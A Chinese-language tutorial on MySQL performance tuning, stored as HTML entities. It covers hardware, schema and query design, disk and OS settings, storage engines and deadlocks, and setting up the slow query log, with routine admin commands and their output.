&#x5B89;&#x88C5;3&#x3001; &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;4&#x3001; &#x670D;&#x52A1;&#x542F;&#x52A8;&#x5173;&#x95ED;&#x811A;&#x672C;&#xFF0C;&#x67E5;&#x770B;&#x7AEF;&#x53E3;5&#x3001; &#x6B64;&#x670D;&#x52A1;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;6&#x3001; &#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5B9E;&#x6218;&#x4E3E;&#x4F8B;7&#x3001; &#x6392;&#x9519;&#xFF08;&#x4ECE;&#x4E0B;&#x5230;&#x4E0A;&#xFF0C;&#x4ECE;&#x5185;&#x5230;&#x5916;&#xFF09; &#x672C;&#x8282;&#x6240;&#x5B66;&#x5185;&#x5BB9;&#xFF1A;&#x2022; &#x8C03;&#x4F18;&#x601D;&#x8DEF;&#xFF1A;&#x2022; 0.&#x786C;&#x4EF6;&#x4F18;&#x5316;&#x2022; 1.&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#x2013;&#x4EE5;&#x540E;&#x518D;&#x4FEE;&#x6539;&#x5F88;&#x9EBB;&#x70E6;&#xFF0C;&#x4F30;&#x8BA1;&#x6570;&#x636E;&#x91CF;&#xFF0C;&#x4F7F;&#x7528;&#x4EC0;&#x4E48;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x2022; 2.&#x6570;&#x636E;&#x7684;&#x5E94;&#x7528;&#x2013;&#x600E;&#x6837;&#x53D6;&#x6570;&#x636E;&#xFF0C;sql &#x8BED;&#x53E5;&#x7684;&#x4F18;&#x5316;&#x2022; 3.&#x78C1;&#x76D8; io &#x4F18;&#x5316;&#x2022; 4.&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;&#x2013;&#x5185;&#x6838;&#x3001;tcp &#x8FDE;&#x63A5;&#x6570;&#x91CF;&#x2022; 5.mysql &#x670D;&#x52A1;&#x4F18;&#x5316;&#x2013;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x78C1;&#x76D8;&#x7684;&#x4F7F;&#x7528;&#x2022; 6.my.cnf &#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;&#x2022; 7 &#x5206;&#x5E93;&#x5206;&#x8868;&#x601D;&#x8DEF;&#x548C;&#x4F18;&#x52A3; 0.&#x786C;&#x4EF6;&#x4F18;&#x5316;CPU&#x2014;&#x2014; 64 &#x4F4D;&#x3001;&#x9AD8;&#x4E3B;&#x9891;&#x3001;&#x9AD8;&#x7F13;&#x5B58;&#xFF0C;&#x9AD8;&#x5E76;&#x884C;&#x5904;&#x7406;&#x80FD;&#x529B;&#x5185;&#x5B58;&#x2014;&#x2014;&#x5927;&#x5185;&#x5B58;&#x3001;&#x4E3B;&#x9891;&#x9AD8;&#xFF0C;&#x5C3D;&#x91CF;&#x4E0D;&#x8981;&#x7528; SWAP&#x786C;&#x76D8;&#x2014;&#x2014;15000&#x8F6C;&#x3001;RAID5&#x3001;RAID10 &#x3001; SSD&#x7F51;&#x7EDC;&#x2014;&#x2014;&#x6807;&#x914D;&#x7684;&#x5343;&#x5146;&#x7F51;&#x5361;&#xFF0C;10G&#x7F51;&#x5361;&#xFF0C;bond0&#xFF0C;MySQL&#x670D;&#x52A1;&#x5668;&#x5C3D;&#x53EF;&#x80FD;&#x548C;&#x4F7F;&#x7528;&#x5B83;&#x7684;web&#x670D;&#x52A1;&#x5668;&#x5728;&#x540C;&#x4E00;&#x5C40;&#x57DF;&#x7F51;&#x5185;&#xFF0C;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x8BF8;&#x5982;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x7B49;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x5F00;&#x9500;&#x3002; 1.&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#xFF08;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x4F18;&#x5316;)&#x7EB5;&#x5411;&#x62C6;&#x89E3;: &#x4E13;&#x673A;&#x4E13;&#x7528;&#x4F8B;&#xFF1A;&#x73B0;&#x5728;&#x516C;&#x53F8;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x540C;&#x65F6;&#x8D1F;&#x8D23; web&#x3001;ftp&#x3001;&#x6570;&#x636E;&#x5E93;&#x7B49;&#x591A;&#x4E2A;&#x89D2;&#x8272;&#x3002; R720 dell &#x5185;&#x5B58; &#xFF1A;768G&#x7EB5;&#x5411;&#x62C6;&#x89E3;&#x540E;&#x5C31;&#x662F;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E13;&#x673A;&#x4E13;&#x7528;&#xFF0C;&#x907F;&#x514D;&#x989D;&#x5916;&#x7684;&#x670D;&#x52A1;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x7684;&#x6027;&#x80FD;&#x4E0B;&#x964D;&#x548C;&#x4E0D;&#x7A33;&#x5B9A;&#x6027;&#x3002; &#x6A2A;&#x5411;&#x62C6;&#x89E3;: &#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x3001;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x3001;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x96C6;&#x7FA4;&#xFF0C;&#x5F53;&#x5355;&#x4E2A; mysql &#x6570;&#x636E;&#x5E93;&#x65E0;&#x6CD5;&#x6EE1;&#x8DB3;&#x65E5;&#x76CA;&#x589E;&#x52A0;&#x7684;&#x9700;&#x6C42;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8FD9;&#x4E2A;&#x903B;&#x8F91;&#x5C42;&#x9762;&#x589E;&#x52A0;&#x591A;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x7A33;&#x5B9A;&#x3001;&#x9AD8;&#x6548;&#x7684;&#x6548;&#x679C;&#x3002; 2&#x3001;&#x67E5;&#x8BE2;&#x4F18;&#x5316;a&gt;&#x5EFA;&#x8868;&#x65F6;&#x8868;&#x7ED3;&#x6784;&#x8981;&#x5408;&#x7406;&#xFF0C;&#x6BCF;&#x4E2A;&#x8868;&#x4E0D;&#x5B9C;&#x8FC7;&#x5927;&#xFF1B;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#x5747;&#x5E94;&#x4F7F;&#x7528;&#x6700;&#x7CBE;&#x786E;&#x7684;&#x7C7B;&#x578B;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;ID&#x5217;&#x7528;int&#x662F;&#x4E00;&#x4E2A;&#x597D;&#x4E3B;&#x610F;&#xFF0C;&#x800C;&#x7528;text&#x7C7B;&#x578B;&#x5219;&#x662F;&#x4E2A;&#x8822;&#x529E;&#x6CD5;&#xFF1B;TIME&#x5217;&#x914C;&#x60C5;&#x4F7F;&#x7528;DATE&#x6216;&#x8005;DATETIME&#x3002;b&gt;&#x7D22;&#x5F15;&#xFF0C;&#x5EFA;&#x7ACB;&#x5408;&#x9002;&#x7684;&#x7D22;&#x5F15;&#x3002;c&gt;&#x67E5;&#x8BE2;&#x65F6;&#x5C3D;&#x91CF;&#x51CF;&#x5C11;&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#xFF08;&#x4E0E;&#x8FD0;&#x7B97;&#x3001;&#x6216;&#x8FD0;&#x7B97;&#x3001;&#x5927;&#x4E8E;&#x5C0F;&#x4E8E;&#x67D0;&#x503C;&#x7684;&#x8FD0;&#x7B97;&#xFF09;&#xFF1B;d&gt;&#x51CF;&#x5C11;&#x4E0D;&#x5F53;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#xFF0C;&#x4E0D;&#x8981;&#x67E5;&#x8BE2;&#x5E94;&#x7528;&#x4E2D;&#x4E0D;&#x9700;&#x8981;&#x7684;&#x5217;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;select * from &#x7B49;&#x64CD;&#x4F5C;&#x3002;e&gt;&#x51CF;&#x5C0F;&#x4E8B;&#x52A1;&#x5305;&#x7684;&#x5927;&#x5C0F;&#xFF1B;f&gt;&#x5C06;&#x591A;&#x4E2A;&#x5C0F;&#x7684;&#x67E5;&#x8BE2;&#x9002;&#x5F53;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x51CF;&#x5C11;&#x6BCF;&#x6B21;&#x5EFA;&#x7ACB;/&#x5173;&#x95ED;&#x67E5;&#x8BE2;&#x65F6;&#x7684;&#x5F00;&#x9500;&#xFF1B;g&gt;&#x5C06;&#x67D0;&#x4E9B;&#x8FC7;&#x4E8E;&#x590D;&#x6742;&#x7684;&#x67E5;&#x8BE2;&#x62C6;&#x89E3;&#x6210;&#x591A;&#x4E2A;&#x5C0F;&#x67E5;&#x8BE2;&#xFF0C;&#x548C;&#x4E0A;&#x4E00;&#x6761;&#x6070;&#x597D;&#x76F8;&#x53CD;h&gt;&#x5EFA;&#x7ACB;&#x548C;&#x4F18;&#x5316;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x6765;&#x4EE3;&#x66FF;&#x5927;&#x91CF;&#x7684;&#x5916;&#x90E8;&#x7A0B;&#x5E8F;&#x4EA4;&#x4E92;&#x3002; 3&#xFF0C;&#x78C1;&#x76D8; IO &#x89C4;&#x5212;&#xFF0C;IO&#x76F8;&#x5173;&#x7684;&#x6280;&#x672F;RAID &#x6280;&#x672F;&#xFF1A;RAID0&#x6216;RAID10SSD15000&#x8F6C;&#x3001;RAID5&#x3001;RAID10 &#x3001;SSDswap &#x5206;&#x533A;&#xFF1A;&#x6700;&#x597D;&#x4F7F;&#x7528; RAID0 &#x6216; SSD&#x78C1;&#x76D8;&#x5206;&#x533A;&#xFF1A;&#x5C06;&#x6570;&#x636E;&#x5E93;&#x76EE;&#x5F55;&#x653E;&#x5230;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x4E0A;&#x6216;&#x4E00;&#x4E2A;&#x78C1;&#x76D8;&#x4E0A;&#x7684;&#x7269;&#x7406;&#x5206;&#x533A;&#xFF0C;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x786C;&#x76D8;&#x6216;&#x5206;&#x533A;&#x548C;&#x7CFB;&#x7EDF;&#x6240;&#x5728;&#x7684;&#x786C;&#x76D8;&#x5206;&#x5F00;&#x3002; &#x8BBE;&#x7F6E;&#x4E3B;&#x4ECE;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;binlog&#x65E5;&#x5FD7;&#x9891;&#x7E41;&#x8BB0;&#x5F55;&#x64CD;&#x4F5C;&#xFF0C;&#x5F00;&#x9500;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x628A;binlog&#x65E5;&#x5FD7;&#x653E;&#x5230;&#x5176;&#x5B83;&#x786C;&#x76D8;&#x5206;&#x533A;&#x4E0A;&#xFF1A; #vim /etc/my.cnf[mysqld]datadir=/data/ #&#x653E;&#x5728;&#x72EC;&#x7ACB;&#x7684;&#x786C;&#x76D8;&#x4E0A;SSDsocket=/var/lib/mysql/mysql.sockuser=mysql# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0 #&#x5728;&#x539F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6DFB;&#x52A0;&#x4EE5;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;log-bin=mysql-bin-master #&#x542F;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;server-id=1 #&#x672C;&#x673A;&#x6570;&#x636E;&#x5E93;ID &#x6807;&#x793A;binlog-do-db=db #&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D; 4.&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;&#x7F51;&#x5361; bonding &#x6280;&#x672F;&#x8BBE;&#x7F6E;tcp &#x8FDE;&#x63A5;&#x6570;&#x91CF;&#x9650;&#x5236;&#xFF0C;&#x4F18;&#x5316;&#x7CFB;&#x7EDF;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x7684;&#x6700;&#x5927;&#x9650;&#x5236;&#x3002;&#x4F7F;&#x7528;64&#x4F4D;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;64&#x4F4D;&#x7CFB;&#x7EDF;&#x53EF;&#x4EE5;&#x5206;&#x7ED9;&#x5355;&#x4E2A;&#x8FDB;&#x7A0B;&#x66F4;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x8BA1;&#x7B97;&#x66F4;&#x5FEB; &#x3002;&#x7981;&#x7528;&#x4E0D;&#x5FC5;&#x8981;&#x542F;&#x52A8;&#x7684;&#x670D;&#x52A1;&#x3002;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x8C03;&#x4F18;&#xFF0C;&#x7ED9;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x4E00;&#x4E2A;&#x5355;&#x72EC;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF0C;&#x63A8;&#x8350;&#x4F7F;&#x7528;XFS&#xFF0C;&#x4E00;&#x822C;&#x6548;&#x7387;&#x66F4;&#x9AD8;&#x3001;&#x66F4;&#x53EF;&#x9760;&#x3002;ext3 &#x4E0D;&#x9519;&#xFF0C;ext4 &#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x8FC7;&#x6E21;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5728;&#x6302;&#x8F7D;&#x5206;&#x533A;&#x65F6;&#x542F;&#x7528; noatime &#x9009;&#x9879;&#x3002; #&#x4E0D;&#x8BB0;&#x5F55;&#x8BBF;&#x95EE;&#x65F6;&#x95F4;&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219;: 1&#xFF09; &#x5B89;&#x88C5;&#x7CFB;&#x7EDF;&#x6700;&#x5C0F;&#x5316; 2&#xFF09; &#x5F00;&#x542F;&#x7A0B;&#x5E8F;&#x670D;&#x52A1;&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219; 3&#xFF09; &#x64CD;&#x4F5C;&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219; 4&#xFF09; &#x767B;&#x5F55;&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219; 5&#xFF09; &#x6743;&#x9650;&#x6700;&#x5C0F;&#x5316; &#x4F8B;&#xFF1A;&#x5173;&#x6389;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;atime&#x9009;&#x9879;123456789[root@jaking ~]# vim /etc/fstab #&#x5728;&#x6302;&#x8F7D;&#x9879;&#x4E2D;&#x6DFB;&#x52A0;noatime&#x9009;&#x9879;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002; UUID=46cb104c-e4dc-4f84-8afc-552f21279c65 /boot t4 defaults,noatime 1 2[root@jaking ~]# mount #&#x67E5;&#x770B;&#x6DFB;&#x52A0;&#x524D;mount&#x6302;&#x8F7D;&#x9009;&#x9879;/dev/sda1 on /boot type ext4 (rw) # &#x4F7F;&#x8BBE;&#x7F6E;&#x7ACB;&#x5373;&#x751F;&#x6548;&#xFF0C;&#x53EF;&#x8FD0;&#x884C;&#xFF1A; [root@jaking ~]# mount -o remount /boot/ [root@jaking ~]# mount /dev/sda1 on /boot type ext4 (rw,noatime) &#x8FD9;&#x6837;&#x4EE5;&#x540E;&#x7CFB;&#x7EDF;&#x5728;&#x8BFB;&#x6B64;&#x5206;&#x533A;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x5C06;&#x4E0D;&#x4F1A;&#x518D;&#x4FEE;&#x6539;atime&#x5C5E;&#x6027;&#x3002;&#x8BF4;&#x660E;&#xFF1A;&#x6D4B;&#x8BD5;&#x6548;&#x679C;&#xFF0C;&#x7ED3;&#x679C;&#x6CA1;&#x6709;&#x592A;&#x5927;&#x7684;&#x610F;&#x4E49;&#x3002; 5. MySQL &#x670D;&#x52A1;&#x4F18;&#x5316;&#xFF08;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x4F18;&#x5316;)&#x4FDD;&#x6301;&#x6BCF;&#x4E2A;&#x8868;&#x90FD;&#x4E0D;&#x8981;&#x592A;&#x5927;&#xFF0C;&#x53EF;&#x4EE5;&#x5BF9;&#x5927;&#x8868;&#x505A;&#x6A2A;&#x5207;&#x548C;&#x7EB5;&#x5207;&#xFF1A;&#x6BD4;&#x5982;&#x8BF4;&#x6211;&#x8981;&#x53D6;&#x5F97;&#x67D0; ID &#x7684; lastlog&#xFF0C; &#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x5F20;&#x53EA;&#x6709;&#x201C;ID&#x548C; &#x201C;lastlog&#x201D;&#x7684;&#x5C0F;&#x8868;&#xFF0C;&#x800C;&#x975E;&#x51E0;&#x5341;&#x3001;&#x51E0;&#x767E;&#x5217;&#x6570;&#x636E;&#x7684;&#x5E76;&#x6392;&#x5927;;&#x53E6;&#x5916;&#x5BF9;&#x4E00;&#x4E2A;&#x6709; 1000 &#x4E07;&#x6761;&#x8BB0;&#x5F55;&#x7684;&#x8868;&#x505A;&#x66F4;&#x65B0;&#x6BD4;&#x5BF9; 10 &#x4E2A; 100 &#x4E07;&#x8BB0;&#x5F55;&#x7684;&#x8868;&#x505A;&#x66F4;&#x65B0;&#x4E00;&#x822C;&#x6765;&#x5F97;&#x8981;&#x6162;&#x3002; &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF1A; MyISAM &#x5F15;&#x64CE;&#xFF0C;&#x8868;&#x7EA7;&#x9501;&#xFF0C;&#x8868;&#x7EA7;&#x9501;&#x5F00;&#x9500;&#x5C0F;&#xFF0C;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x5927;&#xFF0C;&#x9002;&#x5408;&#x8BFB;&#x591A;&#x5199;&#x5C11;&#x7684;&#x8868;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x4E8B;&#x52A1;&#xFF0C;&#x8868;&#x9501;&#x5B9A;&#x4E0D;&#x5B58;&#x5728;&#x6B7B;&#x9501; &#xFF08;&#x4E5F;&#x6709;&#x4F8B;&#x5916;&#xFF09; Innodb &#x5F15;&#x64CE;&#xFF0C;&#x884C;&#x7EA7;&#x9501;&#xFF0C;&#x9501;&#x5B9A;&#x884C;&#x7684;&#x5F00;&#x9500;&#x8981;&#x6BD4;&#x9501;&#x5B9A;&#x5168;&#x8868;&#x8981;&#x5927;&#x3002;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x5C0F;&#xFF0C;&#x9002;&#x5408;&#x5199;&#x64CD;&#x4F5C;&#x6BD4;&#x8F83;&#x9891;&#x7E41;&#x7684;&#x6570;&#x636E;&#x8868;&#x3002;&#x884C;&#x7EA7;&#x9501;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x6B7B;&#x9501; MySQL&#x7684;&#x9501;&#x673A;&#x5236;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5176;&#x6700;&#x663E;&#x8457;&#x7684;&#x7279;&#x70B9;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x652F;&#x6301;&#x4E0D;&#x540C;&#x7684;&#x9501;&#x673A;&#x5236; &#x6240;&#x8C13;&#x6B7B;&#x9501;&#xFF1A;&#x662F;&#x6307;&#x4E24;&#x4E2A;&#x6216;&#x4E24;&#x4E2A;&#x4EE5;&#x4E0A;&#x7684;&#x8FDB;&#x7A0B;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;,&#x56E0;&#x4E89;&#x593A;&#x8D44;&#x6E90;&#x800C;&#x9020;&#x6210;&#x7684;&#x4E00;&#x79CD;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#x7684;&#x73B0;&#x8C61;,&#x82E5;&#x65E0;&#x5916;&#x529B;&#x4F5C;&#x7528;&#xFF0C;&#x5B83;&#x4EEC;&#x90FD;&#x5C06;&#x65E0;&#x6CD5;&#x63A8;&#x8FDB;&#x4E0B;&#x53BB;&#xFF0C;&#x6B64;&#x65F6;&#x79F0;&#x7CFB;&#x7EDF;&#x5904;&#x4E8E;&#x6B7B;&#x9501;&#x72B6;&#x6001;&#x6216;&#x7CFB;&#x7EDF;&#x4EA7;&#x751F;&#x4E86;&#x6B7B;&#x9501;&#xFF0C;&#x8FD9;&#x4E9B;&#x6C38;&#x8FDC;&#x5728;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#x7684;&#x8FDB;&#x7A0B;&#x79F0;&#x4E3A;&#x6B7B;&#x9501;&#x8FDB;&#x7A0B;&#x3002;&#x8868;&#x7EA7;&#x9501;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x6B7B;&#x9501;&#xFF0C;&#x6240;&#x4EE5;&#x89E3;&#x51B3;&#x6B7B;&#x9501;&#x4E3B;&#x8981;&#x8FD8;&#x662F;&#x9488;&#x5BF9;&#x4E8E;&#x6700;&#x5E38;&#x7528;&#x7684;InnoDB &#x4E4B;&#x6240;&#x4EE5;&#x51FA;&#x73B0;&#x6B7B;&#x9501;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x591A;&#x7EBF;&#x7A0B;&#x5BF9;&#x8D44;&#x6E90;&#x7684;&#x5F3A;&#x5360;&#xFF0C;&#x4F60;&#x8981;&#x6211;&#x7684;&#xFF0C;&#x6211;&#x4E5F;&#x8981;&#x4F60;&#x7684;&#xFF0C;&#x4E24;&#x4EBA;&#x5835;&#x5728;&#x8DEF;&#x4E0A;&#x8C01;&#x90FD;&#x4E0D;&#x8BA9;&#xFF0C;&#x6240;&#x4EE5;&#x6B7B;&#x9501;&#x4E86; #&#x5F00;&#x542F;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x540E;&#x4F1A;&#x5C06;&#x6240;&#x6709;&#x7684;&#x6B7B;&#x9501;&#x8BB0;&#x5F55;&#x5230;mysqld.log&#x4E2D; &#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x5728;my.cnf&#x914D;&#x7F6E;&#x4E3A; log-error=/data/mysql/mysqld.log innodb_print_all_deadlocks = 1 innodb_sort_buffer_size = 16M &#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x767B;&#x5F55;mysql123mysql&gt; show status; #&#x770B;&#x7CFB;&#x7EDF;&#x7684;&#x72B6;&#x6001;mysql&gt; show engine innodb status \\G #&#x663E;&#x793A; InnoDB &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x7684;&#x72B6;&#x6001;mysql&gt; show variables; #&#x770B;&#x53D8;&#x91CF; &#x67E5;&#x770B;&#x8B66;&#x544A;&#x4FE1;&#x606F;&#xFF1A;1mysql&gt; show warnings; #&#x67E5;&#x770B;&#x6700;&#x8FD1;&#x4E00;&#x4E2A; sql &#x8BED;&#x53E5;&#x4EA7;&#x751F;&#x7684;&#x9519;&#x8BEF;&#x8B66;&#x544A; &#x4F8B;&#xFF1A;&#x67E5;&#x770B;&#x8B66;&#x544A;&#x4FE1;&#x606F;123456789101112mysql&gt; adadfs; -- &#x968F;&#x4FBF;&#x8F93;&#x5165;&#x4E00;&#x4E9B;&#x5185;&#x5BB9;&#xFF0C;&#x56DE;&#x8F66;&#xFF0C;&#x5C06;&#x770B;&#x5230;&#x4EE5;&#x4E0B;&#x4E00;&#x4E9B;&#x9519;&#x8BEF;&#x4FE1;&#x606F; ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;adadfs&apos; at line 1 mysql&gt; show warnings; mysql&gt; show processlist ; -- &#x663E;&#x793A;mysql&#x7CFB;&#x7EDF;&#x4E2D;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;&#x6240;&#x6709;&#x7EBF;&#x7A0B;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6BCF;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x6B63;&#x5728;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4; -- &#x672C;&#x8BED;&#x53E5;TCP/IP&#x8FDE;&#x63A5;&#x7684;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#xFF08;&#x91C7;&#x7528;host_name:client_port&#x683C;&#x5F0F;&#xFF09;&#xFF0C;&#x4EE5;&#x65B9;&#x4FBF;&#x5730;&#x5224;&#x5B9A;&#x54EA;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x6B63;&#x5728;&#x505A;&#x4EC0;&#x4E48;mysql&gt; show processlist ;+----+------+-----------+------+---------+------+----------+------------------+| Id | User | Host&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | db&#xA0;&#xA0; | Command | Time | State&#xA0;&#xA0;&#xA0; | Info&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+----+------+-----------+------+---------+------+----------+------------------+|&#xA0; 4 | root | localhost | NULL | Query&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0; 0 | starting | show processlist |+----+------+-----------+------+---------+------+----------+------------------+1 row in set (0.00 sec) &#x542F;&#x7528; MySQL &#x6162;&#x67E5;&#x8BE2;&#xFF1A;&#x2014;&#x5206;&#x6790; sql &#x8BED;&#x53E5;&#xFF0C;&#x627E;&#x5230;&#x5F71;&#x54CD;&#x6548;&#x7387;&#x7684; SQL123456[root@jaking ~]# vim /etc/my.cnf [mysqld] slow_query_log=1&#xA0; #&#x5F00;&#x542F;&#x6162;&#x67E5;&#x8BE2;&#x65E5;&#x5FD7;slow-query-log-file=/data/mysql/slow.log &#xA0;#mysql &#x7528;&#x6237;&#x5BF9;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x5177;&#x6709;&#x53EF;&#x5199;&#x6743;&#x9650; long_query_time=5 &#xA0;#&#x67E5;&#x8BE2;&#x8D85;&#x8FC7; 5 &#x79D2;&#x949F;&#x7684;&#x8BED;&#x53E5;&#x8BB0;&#x5F55;&#x4E0B;&#x6765;log-queries-not-using-indexes=1&#xA0; #&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x7684;&#x67E5;&#x8BE2; &#x8FD9;&#x4E09;&#x4E2A;&#x8BBE;&#x7F6E;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x53EF;&#x4EE5;&#x8BB0;&#x5F55;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x8D85;&#x8FC7;5 &#x79D2;&#x548C;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x7684;&#x67E5;&#x8BE2;&#xFF1B;&#x8BF7;&#x6CE8;&#x610F;&#x6709;&#x5173;log-queries-not-using-indexes&#x7684;&#x8B66;&#x544A;&#xFF1B;&#x6162;&#x901F;&#x67E5;&#x8BE2;&#x65E5;&#x5FD7;&#x90FD;&#x4FDD;&#x5B58;&#x5728;/data/mysql/slow.log1234567891011121314[root@jaking ~]# systemctl restart mysqld[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.&#xA0; Commands end with ; or \\g.Your MySQL connection id is 3Server version: 5.7.19-log Source distribution Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners. Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 1234567891011121314151617181920mysql&gt; drop database testdb;Query OK, 12 rows affected (0.01 sec) mysql&gt; create database testdb;Query OK, 1 row affected (0.00 sec) mysql&gt; use testdb;Database changedmysql&gt; create table test (id int,name varchar(20));Query OK, 0 rows affected (0.00 sec) mysql&gt; insert into test values (1,&apos;man&apos;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from test;+------+------+| id&#xA0;&#xA0; | name |+------+------+|&#xA0;&#xA0;&#xA0; 1 | man&#xA0; |+------+------+1 row in set (0.00 sec) &#x67E5;&#x770B;slow.log12345678910[root@jaking ~]# tail -f /data/mysql/slow.log /usr/local/mysql57/bin/mysqld, Version: 5.7.19-log (Source distribution). started with:Tcp port: 3306&#xA0; Unix socket: /data/mysql/mysql.sockTime&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Id Command&#xA0;&#xA0;&#xA0; Argument# Time: 2021-05-15T11:36:01.644259Z# User@Host: root[root] @ localhost []&#xA0; Id:&#xA0;&#xA0;&#xA0;&#xA0; 3# Query_time: 0.000150&#xA0; Lock_time: 0.000062 Rows_sent: 1&#xA0; Rows_examined: 1use 